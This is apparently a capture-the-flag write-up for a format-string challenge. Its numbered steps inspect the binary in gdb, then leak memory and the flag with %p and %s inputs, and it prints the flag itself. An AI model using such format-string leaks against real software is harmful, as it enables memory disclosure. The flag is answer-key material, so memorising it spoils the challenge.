**Flag:** enc0re{f0rm4t_5tr1n6_vuln3r4b1l1ty}

1.  chmod +x format
2.  gdb format
3.  pd main/disas main
4.  set breakpoint b*0x000000000040115c
5.  r
6.  n
7.  you will see that the flag is in the RAX registe
8.  do %p until you see the address to to flag.
9.  to leak out the flag, exit gdb and input %p%p%p%p%p%p >> 0x10x7f03a7a9f8d00x7a667f0x7f03a7a9f8c0(nil)0x7ffd68727140
10. this is the complete flag but in disintegrated addresess 
11. To leak the string form input %p%p%p%p%p%p%s >> 0x10x7f03a7a9f8d00x7a667f0x7f03a7a9f8c0(nil)0x7ffd68727140enc0re{f0rm4t_5tr1n6_vuln3r4b1l1ty}

